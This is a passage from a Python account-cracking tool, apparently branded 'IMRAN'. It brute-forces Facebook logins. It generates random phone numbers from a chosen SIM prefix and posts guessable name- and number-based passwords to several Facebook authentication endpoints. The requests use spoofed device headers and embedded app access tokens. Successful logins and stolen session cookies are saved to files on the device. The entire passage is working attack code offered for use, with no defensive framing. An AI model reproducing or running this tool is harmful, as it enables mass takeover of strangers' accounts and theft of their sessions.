						print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
					open('/sdcard/IMRAN-M3-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
					self.oks.append(ids)
					break
				if twf in str(po):
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{ids}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-M3-2F.txt','a').write(ids+'|'+pas+'\n')
					self.twf.append(ids)
					break
				if "www.facebook.com" in po["error_msg"]:
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{ids}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-M3-CP.txt','a').write(ids+'|'+pas+'\n')
					self.cps.append(ids)
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __bapi__(self,ids,names,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M4/{self.loop}]-[{G}{len(self.oks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","generate_analytics_claim": "1","cpl": "true","try_num": "1","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","generate_session_cookies": "1","error_detail_type": "button_with_disabled","source": "device_based_login","machine_id": str(uuid.uuid4()),"login_location_accuracy_m": "1.0","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": random.choice(["com.facebook.auth.login.AuthOperations$PasswordAuthOperation","com.facebook.account.login.protocol.Fb4aAuthHandler","graphservice","Fb4aAuthHandler","com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"]),"access_token": f"{accessToken}"}
				headers = {"user-agent": ua,"accept-encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","content-type": "application/x-www-form-urlencoded","x-fb-sim-hni": str(random.randint(900000, 999999)),"x-fb-connection-type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","cell.CTRadioAccessTechnologyHSDPA","unknown"]),"Authorization": f"OAuth {accessToken}","x-fb-net-hni": str(random.randint(900000, 999999)),"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-connection-quality": random.choice(["GOOD","MODERATE","EXCELLENT","POOR"]),"x-fb-friendly-name": random.choice(["ViewerReactionsMutation","authenticate"]),"x-fb-http-engine": "Liger"}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://b-api.facebook.com/method/auth.login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					print(f"\r{G}[IMRAN-Ok]{W} {G}{ids}{W} {G}|{W} {G}{pas}{W} ")
					if 'y' in self.cokiex:
						print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
					open('/sdcard/IMRAN-M4-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
					self.oks.append(ids)
					break
				if twf in str(po):
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{ids}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-M4-2F.txt','a').write(ids+'|'+pas+'\n')
					self.twf.append(ids)
					break
				if "www.facebook.com" in po["error_msg"]:
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{ids}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-M4-CP.txt','a').write(ids+'|'+pas+'\n')
					self.cps.append(ids)
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __host__(self,ids,names,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M5/{self.loop}]-[{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				session = requests.Session()
				ua = ___UAH___()
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				link = session.get('https://mbasic.facebook.com/').text
				data = {'__aaid': '0','__user': '0','__a': '1','__req': random.choice(string.digits+string.ascii_lowercase),'__hs': '20466.BP:wbloks_caa_pkg.2.0...0','dpr': random.choice(['1','2','3']),'__ccg': random.choice(["GOOD","MODERATE","EXCELLENT"]),'__rev': str(random.randint(1000000000,1999999999)),"__s": ''.join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(3)),'__hsi': str(int(time.time() * 10000000)),'__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw','fb_dtsg': 'NAftoWe6QwGhG8g-1HXIEQnyUHiBsZsOUv_dF1spCQ9ROcforDEvbKg:0:0','jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#'+pax+':0:'+str(time.time()).split('.')[0]+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
				headers = {'Host': 'mbasic.facebook.com','Connection': 'keep-alive','sec-ch-ua-platform': '"Android"','sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"','sec-ch-ua-model': '""','sec-ch-ua-mobile': '?1','sec-ch-prefers-color-scheme': 'light','User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8','sec-ch-ua-platform-version': '""','Accept': '*/*','Origin': 'https://mbasic.facebook.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://mbasic.facebook.com/','Accept-Language': 'en-US,en;q=0.9',}
				session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',data=data,headers=headers,allow_redirects=False)
				___NOORX___ = session.cookies.get_dict().keys()
				if "c_user" in ___NOORX___:
					cookie = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					print(f"\r{G}[IMRAN-Ok]{W} {G}{ids}{W} {G}|{W} {G}{pas}{W} ")
					if 'y' in self.cokiex:
						print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
					open('/sdcard/IMRAN-M5-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
					self.oks.append(ids)
					break
				if 'checkpoint' in ___NOORX___:
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{ids}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-M5-CP.txt','a').write(ids+'|'+pas+'\n')
					self.cps.append(ids)
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def numberx(self) -> None:
		clear()
		print("[≝] Ex. => 0171 | 0175 | 0176 | 0179 ")
		line()
		bangla = input("[?] Input Sim Code : ")
		line()
		print("[≝] Ex. => 6666 | 7777 | 8888 | 9999 ")
		line()
		libangla = int(input("[?] Input Sim Code : "))
		clear()
		print("[1] Method Graph")
		print("[2] Method B-Graph")
		print("[3] Method Api")
		print("[4] Method B-Api")
		print("[5] Method Host")
		line()
		rnmethod = input("[?] Input Method : ")
		line()
		print("[1] AUTO PASSWORD ")
		print("[2] CUSTOM PASSWORD ")
		line()
		psx = input("[?] Input Password Type : ")
		if psx == "1":
			self.plist.extend(["first6","last6","first8","last8","first7","last7","sumaiya","@123456@","sadiya","alamin","@1234@"])
		if not psx == "1":
			try:
				clear()
				pgx = int(input("[?] Input Password limit : "))
			except:
				pgx = 5
			line()
			print("[≝] EX. => first6 | last6 | first8 | last8 ")
			line()
			for i in range(pgx):
				self.plist.append(input(f"[≝] Password No.{i+1} : "))
		clear()
		print("[1] AUTO CRACK SPEED 30 ")
		print("[2] CUSTOM CRACK SPEED ")
		line()
		rncrck = input("[?] Input Crack Speed : ")
		if rncrck == "1":
			xdx=30
		else:
			while True:
				try:
					line()
					print("[≝] Maximum Crack Speed is 20 <=> 90")
					line()
					xdx=int(input("[?] Input Crack Speed : "))
					if xdx < 20:
						line()
						print("[✗] Lowest Crack Speed is 20 ")
						sleep(1.5)
						line()
						sys.exit()
					if xdx > 90:
						line()
						print("[✗] Highest Crack Speed is 90 ")
						sleep(1.5)
						line()
						sys.exit()
					else:
						break
				except ValueError:
					xdx=30
		for x in range(libangla):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			self.gen.append(nmp)
		clear()
		print("[≝] Do You Wan't To Show Cookie ")
		line()
		joycookie=input("[?] Y/n : ")
		line()
		print("[≝] Do You Wan't To Show Lk/2f/Cp ")
		line()
		joycp2f=input("[?] Y/n : ")
		if joycookie in ["y","Y","yes","Yes","1"]:
			self.cokiex.append("y")
		else:
			self.cokiex.append("n")
		if joycp2f in ["y","Y","yes","Yes","1"]:
			self.cp2f.append("y")
		else:
			self.cp2f.append("n")
		with ThreadPool(max_workers=xdx) as seaxspacex:
			clear()
			print(f"[≝] CODE|LIMIT => {bangla}|{libangla} ")
			print("[≝] If No Result Then Use Apn For 5 mins ")
			line()
			for Xd in self.gen:
				ids = bangla + Xd
				passlist = self.plist
				if rnmethod == "1":
					seaxspacex.submit(self.__rn_graph__,ids,passlist)
				if rnmethod == "2":
					seaxspacex.submit(self.__rn_bgraph__,ids,passlist)
				if rnmethod == "3":
					seaxspacex.submit(self.__rn_api__,ids,passlist)
				if rnmethod == "4":
					seaxspacex.submit(self.__rn_bapi__,ids,passlist)
				if rnmethod == "5":
					seaxspacex.submit(self.__rn_host__,ids,passlist)
				if rnmethod not in ["1","2","3","4","5"]:
					print("[≝] Method Not Found ")
					sleep(1.5)
					line()
					sys.exit()
		print("\033[1;37m")
		line()
		print(f"[≝] The Crack Is Complete\n[≝] Total Ok|2f|Cp => {G}{len(self.oks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W} ")
		line()
		print(f"[≝] Thanks For Using")
		sleep(1.5)
		line()
		sys.exit()

	def __rn_graph__(self,ids,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M1/{self.loop}]-[{G}{len(self.oks)}{W}|{Y}{len(self.lks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			for pw in passlist:
				pas = pw.replace("first6",ids[:6]).replace("First6",ids[:6]).replace("first7",ids[:7]).replace("First7",ids[:7]).replace("first8",ids[:8]).replace("First8",ids[:8]).replace("first9",ids[:9]).replace("First9",ids[:9]).replace("first10",ids[:10]).replace("First10",ids[:10]).replace("number",ids).replace("Number",ids).replace("last6",ids[-6:]).replace("Last6",ids[-6:]).replace("last7",ids[-7:]).replace("Last7",ids[-7:]).replace("last8",ids[-8:]).replace("Last8",ids[-8:]).replace("last9",ids[-9:]).replace("Last9",ids[-9:]).replace("last10",ids[-10:]).replace("Last10",ids[-10:])
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","access_token": f"{accessToken}","generate_session_cookies": "1","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": random.choice(["com.facebook.auth.login.AuthOperations$PasswordAuthOperation","com.facebook.account.login.protocol.Fb4aAuthHandler","graphservice","Fb4aAuthHandler","com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"]),"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {"User-Agent": ua,"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(11111, 99999)),"X-FB-SIM-HNI": str(random.randint(11111, 99999)),"X-FB-Connection-Type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","cell.CTRadioAccessTechnologyHSDPA","unknown"]),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": str(random.randint(1000,9999)),"X-FB-Friendly-Name": random.choice(["ViewerReactionsMutation","authenticate"]),"X-FB-Request-Analytics-Tags": random.choice(["unknown","graphservice"]),"X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					uid = po['uid']
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					res = str(requests.get(f'https://graph.facebook.com/{str(uid)}/picture?type=normal').text)
					if 'Photoshop' in res:
						print(f"\r{G}[IMRAN-Ok]{W} {G}{str(uid)}{W} {G}|{W} {G}{pas}{W} ")
						if 'y' in self.cokiex:
							print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
						open('/sdcard/IMRAN-Random-M1-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
						self.oks.append(str(uid))
						break
					else:
						if 'y' in self.cp2f:
							print(f"\r{Y}[IMRAN-LK]{W} {Y}{str(uid)}{W} {Y}|{W} {Y}{pas}{W} ")
						open('/sdcard/IMRAN-Random-M1-lk.txt','a').write(str(uid)+'|'+pas+'\n')
						self.lks.append(str(uid))
						break
				if twf in str(po):
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{str(uid)}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M1-2F.txt','a').write(str(uid)+'|'+pas+'\n')
					self.twf.append(str(uid))
					break
				if 'www.facebook.com' in po['error']['message']:
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{str(uid)}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M1-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					self.cps.append(str(uid))
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass 

	def __rn_bgraph__(self,ids,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M2/{self.loop}]-[{G}{len(self.oks)}{W}|{Y}{len(self.lks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			for pw in passlist:
				pas = pw.replace("first6",ids[:6]).replace("First6",ids[:6]).replace("first7",ids[:7]).replace("First7",ids[:7]).replace("first8",ids[:8]).replace("First8",ids[:8]).replace("first9",ids[:9]).replace("First9",ids[:9]).replace("first10",ids[:10]).replace("First10",ids[:10]).replace("number",ids).replace("Number",ids).replace("last6",ids[-6:]).replace("Last6",ids[-6:]).replace("last7",ids[-7:]).replace("Last7",ids[-7:]).replace("last8",ids[-8:]).replace("Last8",ids[-8:]).replace("last9",ids[-9:]).replace("Last9",ids[-9:]).replace("last10",ids[-10:]).replace("Last10",ids[-10:])
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
